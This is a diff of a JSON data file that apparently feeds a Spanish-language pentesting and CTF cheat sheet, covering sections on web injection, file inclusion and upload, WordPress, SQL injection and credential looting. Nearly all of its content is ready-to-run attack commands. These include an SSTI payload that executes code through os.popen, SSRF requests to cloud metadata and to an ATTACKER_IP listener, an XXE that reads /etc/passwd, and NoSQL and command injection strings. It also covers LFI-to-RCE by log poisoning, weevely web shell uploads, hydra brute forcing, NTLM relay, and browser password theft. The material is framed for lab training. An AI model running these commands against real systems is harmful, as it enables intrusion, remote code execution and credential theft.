+        ],
+        [
+          "table",
+          [
+            [
+              "Bug",
+              "Senales y prueba inicial"
+            ],
+            [
+              "SSTI",
+              "Payloads {{7*7}}, ${7*7}, <%= 7*7 %>; confirmar motor antes de explotar."
+            ],
+            [
+              "SSRF",
+              "Parametros url/webhook/avatar/import. Confirmar contra tu listener antes de localhost."
+            ],
+            [
+              "XXE",
+              "Entradas XML/SVG/SOAP/SAML/DOCX; probar entidad file:///etc/passwd en lab."
+            ],
+            [
+              "Command injection",
+              "host/ip/domain/filename. Confirmar con id/whoami/hostname o delay controlado."
+            ]
+          ],
+          [
+            3.6,
+            12.6
+          ]
+        ]
+      ],
+      "searchText": "Web inyecciones SSTI, SSRF, XXE, NoSQLi y command injection: confirmar antes de explotar. SSTI curl -sS \"$URL/?name={{7*7}}\" curl -sS \"$URL/?name={{config.__class__.__init__.__globals__['os'].popen('id').read()}}\" SSRF python3 -m http.server 8000 curl -sS \"$URL/fetch?url=http://ATTACKER_IP:8000/\" curl -sS \"$URL/fetch?url=http://169.254.169.254/latest/meta-data/\" curl -sS \"$URL/fetch?url=http://127.0.0.1:80/\" XXE printf '<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><root>&xxe;</root>' > xxe.xml curl -sS -X POST $URL/upload --data-binary @xxe.xml -H 'Content-Type: application/xml' NoSQL injection curl -sS -X POST $URL/login -H 'Content-Type: application/json' -d '{\"username\":{\"$ne\":null},\"password\":{\"$ne\":null}}' curl -sS \"$URL/login?username[$ne]=admin&password[$ne]=x\" Command injection curl -sS -X POST \"$URL/api/ping\" -H 'Content-Type: application/json' -d '{\"host\":\"127.0.0.1; id\"}' curl -sS \"$URL/convert?file=test.jpg; id\" SSTI: confirma primero con una operacion matematica ({{7*7}}); identifica el motor antes de ir a por RCE. SSRF: confirma SIEMPRE contra tu propio listener antes de probar localhost/metadata/redes internas. XXE: solo aplica si la app procesa XML (import, SOAP, SVG, DOCX/XLSX, SAML). Si no refleja salida, intenta OOB. NoSQLi: senal = backend Node/Mongo, errores BSON/Mongoose, filtros JSON directos en login o busqueda. Command injection: confirma con comandos inocuos (id/whoami/hostname) antes de nada destructivo; sin output, usa sleep/ping hacia tu maquina. Bug Senales y prueba inicial SSTI Payloads {{7*7}}, ${7*7}, <%= 7*7 %>; confirmar motor antes de explotar. SSRF Parametros url/webhook/avatar/import. Confirmar contra tu listener antes de localhost. XXE Entradas XML/SVG/SOAP/SAML/DOCX; probar entidad file:///etc/passwd en lab. Command injection host/ip/domain/filename. Confirmar con id/whoami/hostname o delay controlado."
+    },
+    {
+      "id": "section-09",
+      "order": 9,
+      "slug": "web-ficheros-y-ejecucion",
+      "title": "Web ficheros y ejecucion",
+      "summary": "LFI, LFI a RCE, file upload y codigo fuente expuesto.",
+      "phase": "enumeration",
+      "tags": [
+        "web"
+      ],
+      "commands": [
+        "curl -sS \"$URL/page.php?file=../../../../etc/passwd\"",
+        "curl -sS \"$URL/page.php?file=php://filter/convert.base64-encode/resource=index.php\"",
+        "curl -sS \"$URL/page.php?file=/proc/self/environ\"",
+        "curl -sS \"$URL/page.php?file=php://filter/convert.base64-encode/resource=config.php\"",
+        "curl -sS \"$URL/page.php?file=/var/log/apache2/access.log\"",
+        "curl -sS \"$URL/\" -A 'PAYLOAD_PHP'; curl -sS \"$URL/page.php?file=/var/log/apache2/access.log&c=id\"",
+        "curl -sS --data 'PAYLOAD_PHP' \"$URL/page.php?file=php://input&c=id\"",
+        "curl -sS \"$URL/page.php?file=data://text/plain;base64,BASE64_PHP&c=id\"",
+        "python3 php_filter_chain_generator.py --chain 'PAYLOAD_PHP'",
+        "curl -sS -F 'file=@shell.phtml;type=image/png' \"$URL/upload\"",
+        "weevely generate S3cr3t shell.php",
+        "weevely $URL/uploads/shell.php S3cr3t",
+        "curl -sS \"$URL/.git/HEAD\"",
+        "git-dumper $URL/.git/ ./loot_git"
+      ],
+      "tables": [
+        [
+          "Control de upload",
+          "Pruebas"
+        ],
+        [
+          "Extension",
+          "php, phtml, phar, jsp, aspx, svg, html, doble extension."
+        ],
+        [
+          "Content-Type",
+          "image/png vs application/x-php."
+        ],
+        [
+          "Magic bytes",
+          "GIF89a, PNG header si el lab valida firma."
+        ],
+        [
+          "Ruta",
+          "Se puede predecir uploads/? Hay path traversal en filename?"
+        ],
+        [
+          "Ejecucion",
+          "El servidor ejecuta o solo sirve el archivo?"
+        ]
+      ],
+      "blocks": [
+        [
+          "h2",
+          "LFI y lectura de ficheros"
         ],
         [
           "code",
           [
             "curl -sS \"$URL/page.php?file=../../../../etc/passwd\"",
             "curl -sS \"$URL/page.php?file=php://filter/convert.base64-encode/resource=index.php\"",
-            "curl -sS \"$URL/page.php?file=/proc/self/environ\"",
-            "curl -sS \"$URL/?name={{7*7}}\"",
-            "curl -sS \"$URL/?name={{config.__class__.__init__.__globals__['os'].popen('id').read()}}\"",
-            "weevely generate S3cr3t shell.php",
-            "curl -sS -F 'file=@shell.phtml;type=image/png' \"$URL/upload\"",
-            "weevely $URL/uploads/shell.php S3cr3t",
-            "git-dumper $URL/.git/ ./loot_git",
-            "curl -sS \"$URL/.git/HEAD\""
+            "curl -sS \"$URL/page.php?file=/proc/self/environ\""
           ]
         ],
         [
@@ -1131,7 +1358,6 @@
             "curl -sS \"$URL/\" -A 'PAYLOAD_PHP'; curl -sS \"$URL/page.php?file=/var/log/apache2/access.log&c=id\"",
             "curl -sS --data 'PAYLOAD_PHP' \"$URL/page.php?file=php://input&c=id\"",
             "curl -sS \"$URL/page.php?file=data://text/plain;base64,BASE64_PHP&c=id\"",
-            "curl -sS \"$URL/page.php?file=/proc/self/environ\" -A 'PAYLOAD_PHP'",
             "python3 php_filter_chain_generator.py --chain 'PAYLOAD_PHP'"
           ]
         ],
@@ -1145,54 +1371,53 @@
         ],
         [
           "h2",
-          "Triage de bugs"
+          "File upload"
         ],
         [
-          "p",
-          "Guia rapida: que senal delata cada tipo de bug y con que prueba minima lo confirmas sin falsos positivos."
+          "code",
+          [
+            "curl -sS -F 'file=@shell.phtml;type=image/png' \"$URL/upload\"",
+            "weevely generate S3cr3t shell.php",
+            "weevely $URL/uploads/shell.php S3cr3t"
+          ]
+        ],
+        [
+          "h2",
+          "Codigo fuente expuesto"
+        ],
+        [
+          "code",
+          [
+            "curl -sS \"$URL/.git/HEAD\"",
+            "git-dumper $URL/.git/ ./loot_git"
+          ]
         ],
         [
           "table",
           [
             [
-              "Bug",
-              "Senales y prueba inicial"
+              "Control de upload",
+              "Pruebas"
             ],
             [
-              "LFI",
-              "Parametros file/page/lang/template. Probar ../../../../etc/passwd y php://filter."
+              "Extension",
+              "php, phtml, phar, jsp, aspx, svg, html, doble extension."
             ],
             [
-              "SSTI",
-              "Payloads {{7*7}}, ${7*7}, <%= 7*7 %>; confirmar motor antes de explotar."
+              "Content-Type",
+              "image/png vs application/x-php."
             ],
             [
-              "IDOR/BOLA",
-              "Cambiar IDs entre usuarios. Si ves datos ajenos, hay autorizacion rota."
+              "Magic bytes",
+              "GIF89a, PNG header si el lab valida firma."
             ],
             [
-              "JWT",
-              "Revisar alg, kid, role, user_id, exp. Probar solo si el reto apunta a firma debil."
+              "Ruta",
+              "Se puede predecir uploads/? Hay path traversal en filename?"
             ],
             [
-              "GraphQL",
-              "Introspection, tipos, queries/mutations con id/userId/admin/debug."
-            ],
-            [
-              "SSRF",
-              "Parametros url/webhook/avatar/import. Confirmar contra tu listener antes de localhost."
-            ],
-            [
-              "XXE",
-              "Entradas XML/SVG/SOAP/SAML/DOCX; probar entidad file:///etc/passwd en lab."
-            ],
-            [
-              "Upload",
-              "Extension, Content-Type, magic bytes, doble extension, ruta de ejecucion."
-            ],
-            [
-              "Command injection",
-              "host/ip/domain/filename. Confirmar con id/whoami/hostname o delay controlado."
+              "Ejecucion",
+              "El servidor ejecuta o solo sirve el archivo?"
             ]
           ],
           [
@@ -1201,11 +1426,11 @@
           ]
         ]
       ],
-      "searchText": "Web y APIs De discovery web a bugs de autorizacion, SSRF, JWT y uploads. Fingerprinting y discovery Antes de atacar, mapea la web: que tecnologia corre y que rutas existen. El fuzzing saca paneles, backups y APIs que no estan enlazados. curl -i $URL/ whatweb -a 3 $URL ffuf -u \"$URL/FUZZ\" -w /usr/share/wordlists/dirb/common.txt -e .php,.txt,.html -fc 404 ffuf -u \"$URL/\" -H \"Host: FUZZ.target.local\" -w subdomains.txt -fs 0 gobuster dir -u $URL -w /usr/share/wordlists/dirb/common.txt -x php,txt,html -b 404 gobuster vhost -u $URL -w subdomains.txt --append-domain feroxbuster -u $URL -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,txt,html wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/common.txt --hc 404 $URL/FUZZ wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt --hc 404 $URL/FUZZ wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -z list,php-txt-html --hc 404 $URL/FUZZ.FUZ2Z ffuf -u \"$URL/FUZZ\" -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt -e .php,.txt,.bak,.old,.zip -fc 404 ffuf -u \"$URL/api/FUZZ\" -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt -fc 404 ffuf -u \"$URL/FUZZ\" -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -X POST -d 'FUZZ=test' -H 'Content-Type: application/x-www-form-urlencoded' -fs 0 wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -d 'FUZZ=test' --hh 0 $URL/page.php ffuf -u \"$URL/FUZZ\" -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -recursion -recursion-depth 2 -fc 404 katana -u $URL -d 3 arjun -u \"$URL/page.php\" Si todo devuelve 200, mide una ruta random y filtra por -fs/-fw/-fl en ffuf o --hh/--hw/--hl en wfuzz. Separa fuzzing de rutas, archivos, vhosts y parametros; mezclarlo todo genera ruido y pierdes hallazgos. En APIs prueba primero endpoints conocidos por JS/katana y despues fuzzing sobre /api, /v1, /graphql o rutas versionadas. En THM empieza con wordlists pequenas y sube a raft/medium cuando tengas senales reales. Fuzzea el metodo HTTP (GET/POST/PUT/DELETE/PATCH): un endpoint puede aceptar datos o ser inyectable solo por un verbo concreto. APIs REST y metodos HTTP Las APIs se prueban distinto a una web clasica: importan el metodo HTTP y el cuerpo JSON. Un endpoint puede ser vulnerable solo por un verbo (PUT/POST) o por un campo del JSON. curl -sS $URL/api/ ; curl -sS $URL/api/v1/ curl -sS $URL/swagger.json ; curl -sS $URL/openapi.json ; curl -sS $URL/api-docs curl -sS -i -X OPTIONS \"$URL/api/resource\" for m in GET POST PUT DELETE PATCH OPTIONS HEAD; do echo -n \"$m \"; curl -s -o /dev/null -w \"%{http_code}\\n\" -X $m \"$URL/api/resource\"; done curl -sS -i -X PUT \"$URL/api/resource\" -H 'Content-Type: application/json' -d '{}' curl -sS -i -X POST \"$URL/api/resource\" -H 'X-HTTP-Method-Override: PUT' curl -sS -X POST \"$URL/api/login\" -H 'Content-Type: application/json' -d '{\"username\":\"admin\",\"password\":\"test\"}' curl -sS -X POST \"$URL/api/search\" -H 'Content-Type: application/json' -d '{\"q\":\"1 OR 1=1-- -\"}' curl -sS -X POST \"$URL/api/ping\" -H 'Content-Type: application/json' -d '{\"host\":\"127.0.0.1; id\"}' curl -sS \"$URL/api/me\" -H \"Authorization: Bearer $TOKEN\" sqlmap -r request.txt --batch --level 3 Explotacion web (LFI / SSTI / upload) Payloads para los bugs mas comunes: LFI (leer ficheros del servidor), SSTI (inyeccion en plantillas) y subida de ficheros. Confirma con una prueba inocua antes de ir a por ejecucion. curl -sS \"$URL/page.php?file=../../../../etc/passwd\" curl -sS \"$URL/page.php?file=php://filter/convert.base64-encode/resource=index.php\" curl -sS \"$URL/page.php?file=/proc/self/environ\" curl -sS \"$URL/?name={{7*7}}\" curl -sS \"$URL/?name={{config.__class__.__init__.__globals__['os'].popen('id').read()}}\" weevely generate S3cr3t shell.php curl -sS -F 'file=@shell.phtml;type=image/png' \"$URL/upload\" weevely $URL/uploads/shell.php S3cr3t git-dumper $URL/.git/ ./loot_git curl -sS \"$URL/.git/HEAD\" LFI a RCE LFI por si solo solo LEE ficheros. Para EJECUTAR codigo tienes que incluir un fichero que TU controlas: un log envenenado con tu User-Agent, php://input, data:// o /proc/self/environ. PAYLOAD_PHP es tu codigo PHP minimo (un system del parametro c). curl -sS \"$URL/page.php?file=php://filter/convert.base64-encode/resource=config.php\" curl -sS \"$URL/page.php?file=/var/log/apache2/access.log\" curl -sS \"$URL/\" -A 'PAYLOAD_PHP'; curl -sS \"$URL/page.php?file=/var/log/apache2/access.log&c=id\" curl -sS --data 'PAYLOAD_PHP' \"$URL/page.php?file=php://input&c=id\" curl -sS \"$URL/page.php?file=data://text/plain;base64,BASE64_PHP&c=id\" curl -sS \"$URL/page.php?file=/proc/self/environ\" -A 'PAYLOAD_PHP' python3 php_filter_chain_generator.py --chain 'PAYLOAD_PHP' LFI a RCE: si puedes incluir un fichero, busca uno que TU controles (logs con tu User-Agent, /proc/self/environ, php://input o data://). PAYLOAD_PHP es tu codigo PHP minimo (un system del parametro c); envenenas el log/entrada y luego lo incluyes con ?file= para que se ejecute. Si solo puedes leer, php://filter saca el codigo fuente en base64: ahi suelen estar las credenciales de BD. Triage de bugs Guia rapida: que senal delata cada tipo de bug y con que prueba minima lo confirmas sin falsos positivos. Bug Senales y prueba inicial LFI Parametros file/page/lang/template. Probar ../../../../etc/passwd y php://filter. SSTI Payloads {{7*7}}, ${7*7}, <%= 7*7 %>; confirmar motor antes de explotar. IDOR/BOLA Cambiar IDs entre usuarios. Si ves datos ajenos, hay autorizacion rota. JWT Revisar alg, kid, role, user_id, exp. Probar solo si el reto apunta a firma debil. GraphQL Introspection, tipos, queries/mutations con id/userId/admin/debug. SSRF Parametros url/webhook/avatar/import. Confirmar contra tu listener antes de localhost. XXE Entradas XML/SVG/SOAP/SAML/DOCX; probar entidad file:///etc/passwd en lab. Upload Extension, Content-Type, magic bytes, doble extension, ruta de ejecucion. Command injection host/ip/domain/filename. Confirmar con id/whoami/hostname o delay controlado. arjun -u \"$URL/api/endpoint\" ffuf -u \"$URL/FUZZ\" -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -fc 404 ffuf -u \"$URL/FUZZ\" -w /usr/share/seclists/Discovery/Web-Content/common.txt -fc 404 ffuf -u \"$URL/FUZZ\" -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -fc 404,403 ffuf -u \"$URL/FUZZ\" -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt -e .php,.txt,.html,.bak,.old,.zip -fc 404 ffuf -u \"$URL/FUZZ/\" -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -recursion -recursion-depth 2 -fc 404 ffuf -u \"$URL/\" -H \"Host: FUZZ.$DOMAIN\" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs 0 wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt --hc 404,403 $URL/FUZZ/ wfuzz -c -H \"Host: FUZZ.$DOMAIN\" -z file,/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --hh 0 $URL/ feroxbuster -u $URL -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,txt,html,bak,old,zip -k gobuster dir -u $URL -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,txt,html,bak,old,zip -b 404 gobuster vhost -u $URL -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain GET /api/users/1001 GET /api/users/1002 GET /api/orders/5 GET /api/orders/6 jwt_tool TOKEN python3 - <<'PY'\nimport jwt\nprint(jwt.get_unverified_header('TOKEN'))\nprint(jwt.decode('TOKEN', options={'verify_signature': False}))\nPY POST /graphql {\"query\":\"{__schema{types{name}}}\"} {\"query\":\"{users{id username email role}}\"} url=http://127.0.0.1:80 url=http://localhost:8000 url=http://169.254.169.254/latest/meta-data/ url=http://[::1]/ url=file:///etc/passwd <?xml version=\"1.0\"?> <!DOCTYPE root [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]> <root>&xxe;</root> {\"username\":{\"$ne\":null},\"password\":{\"$ne\":null}} username[$ne]=admin&password[$ne]=x {\"$where\":\"this.username=='admin'\"} ; id && id | id `id` $(id) %0Aid"
+      "searchText": "Web ficheros y ejecucion LFI, LFI a RCE, file upload y codigo fuente expuesto. LFI y lectura de ficheros curl -sS \"$URL/page.php?file=../../../../etc/passwd\" curl -sS \"$URL/page.php?file=php://filter/convert.base64-encode/resource=index.php\" curl -sS \"$URL/page.php?file=/proc/self/environ\" LFI a RCE LFI por si solo solo LEE ficheros. Para EJECUTAR codigo tienes que incluir un fichero que TU controlas: un log envenenado con tu User-Agent, php://input, data:// o /proc/self/environ. PAYLOAD_PHP es tu codigo PHP minimo (un system del parametro c). curl -sS \"$URL/page.php?file=php://filter/convert.base64-encode/resource=config.php\" curl -sS \"$URL/page.php?file=/var/log/apache2/access.log\" curl -sS \"$URL/\" -A 'PAYLOAD_PHP'; curl -sS \"$URL/page.php?file=/var/log/apache2/access.log&c=id\" curl -sS --data 'PAYLOAD_PHP' \"$URL/page.php?file=php://input&c=id\" curl -sS \"$URL/page.php?file=data://text/plain;base64,BASE64_PHP&c=id\" python3 php_filter_chain_generator.py --chain 'PAYLOAD_PHP' LFI a RCE: si puedes incluir un fichero, busca uno que TU controles (logs con tu User-Agent, /proc/self/environ, php://input o data://). PAYLOAD_PHP es tu codigo PHP minimo (un system del parametro c); envenenas el log/entrada y luego lo incluyes con ?file= para que se ejecute. Si solo puedes leer, php://filter saca el codigo fuente en base64: ahi suelen estar las credenciales de BD. File upload curl -sS -F 'file=@shell.phtml;type=image/png' \"$URL/upload\" weevely generate S3cr3t shell.php weevely $URL/uploads/shell.php S3cr3t Codigo fuente expuesto curl -sS \"$URL/.git/HEAD\" git-dumper $URL/.git/ ./loot_git Control de upload Pruebas Extension php, phtml, phar, jsp, aspx, svg, html, doble extension. Content-Type image/png vs application/x-php. Magic bytes GIF89a, PNG header si el lab valida firma. Ruta Se puede predecir uploads/? Hay path traversal en filename? Ejecucion El servidor ejecuta o solo sirve el archivo?"
     },
     {
-      "id": "section-07",
-      "order": 7,
+      "id": "section-10",
+      "order": 10,
       "slug": "wordpress",
       "title": "WordPress",
       "summary": "Workflow reducido para cuando detectas WordPress.",
@@ -1298,8 +1523,8 @@
       "searchText": "WordPress Workflow reducido para cuando detectas WordPress. Confirmar y enumerar curl -sS -I $URL/wp-login.php | head curl -sS $URL/ | grep -iE \"wp-content|wp-includes\" | head wpscan --url $URL --enumerate p,t,u wpscan --url $URL --plugins-detection mixed --enumerate ap,at,u curl -sS \"$URL/wp-json/wp/v2/users?per_page=100\" | head Prioriza plugins/temas frente al core si WordPress esta actualizado. Revisa uploads, backups de wp-config.php, XML-RPC y REST API. Con wp-admin, busca plugins vulnerables, upload/import y roles. En CTF puede haber RCE por theme/plugin editor. Hallazgo Siguiente paso Usuario WP Probar password reuse o WPScan brute force moderado si el lab lo permite. Plugin versionado Buscar CVE, exploit-db, WPScan API y PoC legible. wp-config filtrado Extraer DB creds, conectar MySQL, buscar hashes o admin. Acceso admin Subida plugin/theme o funcionalidad vulnerable; documentar vector exacto."
     },
     {
-      "id": "section-08",
-      "order": 8,
+      "id": "section-11",
+      "order": 11,
       "slug": "sqli",
       "title": "SQLi",
       "summary": "Confirmar, extraer y decidir cuando usar SQLMap.",
@@ -1404,8 +1629,8 @@
       "searchText": "SQLi Confirmar, extraer y decidir cuando usar SQLMap. SQLi se resuelve mejor si primero entiendes el tipo de inyeccion. SQLMap acelera, pero una confirmacion manual evita falsos positivos y ruido. Tipo Senal Error-based Errores SQL visibles por comillas, casts o payloads invalidos. UNION-based La respuesta refleja columnas y puedes alinear SELECT/UNION. Boolean blind La respuesta cambia con condiciones true/false. Time blind No ves datos, pero sleep/pg_sleep/waitfor delay modifica tiempos. Second-order El payload se almacena y se ejecuta en otra vista o accion posterior. SQLMap practico sqlmap -r request.txt --batch sqlmap -r request.txt --dbs sqlmap -r request.txt -D db -T users --dump sqlmap -u \"$URL/page.php?id=1\" --risk 2 --level 3 --batch sqlmap -r request.txt --os-shell Usa requests de Burp para cookies, headers, POST y auth. Sube risk/level solo si la confirmacion basica no basta. Si el objetivo es CTF, extrae lo necesario: usuarios, hashes, configs, rutas o RCE."
     },
     {
-      "id": "section-09",
-      "order": 9,
+      "id": "section-12",
+      "order": 12,
       "slug": "credenciales-y-loot",
       "title": "Credenciales y loot",
       "summary": "Buscar, convertir, crackear y reutilizar sin caos.",
@@ -1448,34 +1673,7 @@
         "steghide info imagen.jpg ; steghide extract -sf imagen.jpg",
         "stegseek imagen.jpg /usr/share/wordlists/rockyou.txt",
         "zsteg -a imagen.png",
-        "foremost -i archivo -o salida",
-        "find / -name '*pass*' -o -name '*cred*' -o -name '*.kdbx' 2>/dev/null",
-        "grep -RniE 'pass|password|passwd|pwd|secret|token|api[_-]?key' /var/www /opt /home 2>/dev/null",
-        "find /home -name '.ssh' -type d 2>/dev/null",
-        "cat ~/.bash_history 2>/dev/null",
-        "ls -la /var/backups /backup /opt 2>/dev/null",
-        "cmdkey /list",
-        "dir /s /b *pass* *cred* *config* *backup* *.kdbx 2>nul",
-        "findstr /si password *.txt *.ini *.config *.xml *.json 2>nul",
-        "type %USERPROFILE%\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt 2>nul",
-        "type C:\\Windows\\Panther\\Unattend.xml 2>nul",
-        "rar2john secret.rar > rar.hash",
-        "office2john document.docx > office.hash",
-        "pdf2john file.pdf > pdf.hash",
-        "hashid hash.txt",
-        "hashcat --example-hashes | grep -i ntlm -n",
-        "hashcat -m 3200 bcrypt.hash /usr/share/wordlists/rockyou.txt",
-        "hashcat --show -m 1000 ntlm.hash",
-        "ssh user@$IP",
-        "smbclient -L //$IP -U 'user%password'",
-        "nxc smb $IP -u user -p password",
-        "nxc winrm $IP -u user -p password",
-        "mysql -h $IP -u user -p",
-        "sudo -l",
-        "keepass2john database.kdbx > keepass.hash",
-        "john --wordlist=/usr/share/wordlists/rockyou.txt keepass.hash",
-        "john --show keepass.hash",
-        "kpcli --kdb database.kdbx"
+        "foremost -i archivo -o salida"
       ],
       "tables": [
         [
@@ -1644,11 +1842,11 @@
           ]
         ]
       ],
-      "searchText": "Credenciales y loot Buscar, convertir, crackear y reutilizar sin caos. Fuente Que mirar Web root .env, config.php, wp-config.php, web.config, appsettings.json. Homes .ssh, history, Desktop, Downloads, backups, notas. Shares Backups, IT, Dev, Deploy, SYSVOL, NETLOGON, scripts. Windows cmdkey, Unattend.xml, PowerShell history, IIS configs. Linux /var/www, /opt, /var/backups, cron scripts, bash history. Conversiones frecuentes hashid 'HASH' nth -t 'HASH' ssh2john id_rsa > id_rsa.hash keepass2john vault.kdbx > keepass.hash zip2john secret.zip > zip.hash office2john doc.docx > office.hash john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt john --show hash.txt hashcat -m 1000 ntlm.hash /usr/share/wordlists/rockyou.txt Buscar en disco y reutilizar grep -riE 'password|passwd|secret|api_key' /var/www /home /opt 2>/dev/null | head find / \\( -name '*.kdbx' -o -name 'id_rsa' -o -name '.env' \\) 2>/dev/null nxc smb $IP -u $USER -p $PASS nxc winrm $IP -u $USER -p $PASS ssh $USER@$IP Fuerza bruta online a logins (hydra) hydra -l admin -P /usr/share/wordlists/rockyou.txt $IP ssh hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ftp://$IP hydra -l admin -P rockyou.txt $IP http-post-form \"/login:user=^USER^&pass=^PASS^:F=Invalid\" hydra -l admin -P rockyou.txt $IP http-get /admin/ medusa -h $IP -u admin -P rockyou.txt -M ssh nxc smb $IP -u users.txt -p rockyou.txt --continue-on-success Capturar y relay de hashes de red (Responder) sudo responder -I tun0 -wv impacket-ntlmrelayx -tf targets.txt -smb2support hashcat -m 5600 netntlmv2.hash /usr/share/wordlists/rockyou.txt Fuerza bruta http: dispara una vez, mira el mensaje de fallo real (F=...) y ajustalo, o hydra dara todo como valido. Con muchos usuarios y una sola password (spraying) evitas bloqueos; muchas passwords por usuario los provoca. Responder captura NetNTLMv2 (crackeable con -m 5600); si SMB signing esta off, mejor relay con ntlmrelayx. Loot de navegadores y apps find / \\( -name logins.json -o -name key4.db -o -name signons.sqlite \\) 2>/dev/null python3 firefox_decrypt.py ~/.mozilla/firefox/*.default-release/ python3 firefox_decrypt.py /ruta/al/perfil lazagne.exe all python3 lazagne.py browsers Stego y forense de ficheros file archivo; strings -n 8 archivo exiftool imagen.jpg binwalk -e archivo steghide info imagen.jpg ; steghide extract -sf imagen.jpg stegseek imagen.jpg /usr/share/wordlists/rockyou.txt zsteg -a imagen.png foremost -i archivo -o salida Firefox guarda logins en logins.json + key4.db; con firefox_decrypt sacas las passwords en claro. Etiqueta cada credencial por fuente y servicio probado. Despues de cada credencial valida, reenumera: shares, sudo, WinRM, DB, panel web, LDAP. En AD evita spraying agresivo; usa usuarios reales y una password candidata con control. find / -name '*pass*' -o -name '*cred*' -o -name '*.kdbx' 2>/dev/null grep -RniE 'pass|password|passwd|pwd|secret|token|api[_-]?key' /var/www /opt /home 2>/dev/null find /home -name '.ssh' -type d 2>/dev/null cat ~/.bash_history 2>/dev/null ls -la /var/backups /backup /opt 2>/dev/null cmdkey /list dir /s /b *pass* *cred* *config* *backup* *.kdbx 2>nul findstr /si password *.txt *.ini *.config *.xml *.json 2>nul type %USERPROFILE%\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt 2>nul type C:\\Windows\\Panther\\Unattend.xml 2>nul rar2john secret.rar > rar.hash office2john document.docx > office.hash pdf2john file.pdf > pdf.hash hashid hash.txt hashcat --example-hashes | grep -i ntlm -n hashcat -m 3200 bcrypt.hash /usr/share/wordlists/rockyou.txt hashcat --show -m 1000 ntlm.hash ssh user@$IP smbclient -L //$IP -U 'user%password' nxc smb $IP -u user -p password nxc winrm $IP -u user -p password mysql -h $IP -u user -p sudo -l keepass2john database.kdbx > keepass.hash john --wordlist=/usr/share/wordlists/rockyou.txt keepass.hash john --show keepass.hash kpcli --kdb database.kdbx"
+      "searchText": "Credenciales y loot Buscar, convertir, crackear y reutilizar sin caos. Fuente Que mirar Web root .env, config.php, wp-config.php, web.config, appsettings.json. Homes .ssh, history, Desktop, Downloads, backups, notas. Shares Backups, IT, Dev, Deploy, SYSVOL, NETLOGON, scripts. Windows cmdkey, Unattend.xml, PowerShell history, IIS configs. Linux /var/www, /opt, /var/backups, cron scripts, bash history. Conversiones frecuentes hashid 'HASH' nth -t 'HASH' ssh2john id_rsa > id_rsa.hash keepass2john vault.kdbx > keepass.hash zip2john secret.zip > zip.hash office2john doc.docx > office.hash john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt john --show hash.txt hashcat -m 1000 ntlm.hash /usr/share/wordlists/rockyou.txt Buscar en disco y reutilizar grep -riE 'password|passwd|secret|api_key' /var/www /home /opt 2>/dev/null | head find / \\( -name '*.kdbx' -o -name 'id_rsa' -o -name '.env' \\) 2>/dev/null nxc smb $IP -u $USER -p $PASS nxc winrm $IP -u $USER -p $PASS ssh $USER@$IP Fuerza bruta online a logins (hydra) hydra -l admin -P /usr/share/wordlists/rockyou.txt $IP ssh hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ftp://$IP hydra -l admin -P rockyou.txt $IP http-post-form \"/login:user=^USER^&pass=^PASS^:F=Invalid\" hydra -l admin -P rockyou.txt $IP http-get /admin/ medusa -h $IP -u admin -P rockyou.txt -M ssh nxc smb $IP -u users.txt -p rockyou.txt --continue-on-success Capturar y relay de hashes de red (Responder) sudo responder -I tun0 -wv impacket-ntlmrelayx -tf targets.txt -smb2support hashcat -m 5600 netntlmv2.hash /usr/share/wordlists/rockyou.txt Fuerza bruta http: dispara una vez, mira el mensaje de fallo real (F=...) y ajustalo, o hydra dara todo como valido. Con muchos usuarios y una sola password (spraying) evitas bloqueos; muchas passwords por usuario los provoca. Responder captura NetNTLMv2 (crackeable con -m 5600); si SMB signing esta off, mejor relay con ntlmrelayx. Loot de navegadores y apps find / \\( -name logins.json -o -name key4.db -o -name signons.sqlite \\) 2>/dev/null python3 firefox_decrypt.py ~/.mozilla/firefox/*.default-release/ python3 firefox_decrypt.py /ruta/al/perfil lazagne.exe all python3 lazagne.py browsers Stego y forense de ficheros file archivo; strings -n 8 archivo exiftool imagen.jpg binwalk -e archivo steghide info imagen.jpg ; steghide extract -sf imagen.jpg stegseek imagen.jpg /usr/share/wordlists/rockyou.txt zsteg -a imagen.png foremost -i archivo -o salida Firefox guarda logins en logins.json + key4.db; con firefox_decrypt sacas las passwords en claro. Etiqueta cada credencial por fuente y servicio probado. Despues de cada credencial valida, reenumera: shares, sudo, WinRM, DB, panel web, LDAP. En AD evita spraying agresivo; usa usuarios reales y una password candidata con control."
     },
     {
-      "id": "section-10",
-      "order": 10,
+      "id": "section-13",
+      "order": 13,
       "slug": "acceso-inicial",
       "title": "Acceso inicial",
       "summary": "Convertir un hallazgo en shell estable o login util.",
@@ -1780,8 +1978,8 @@
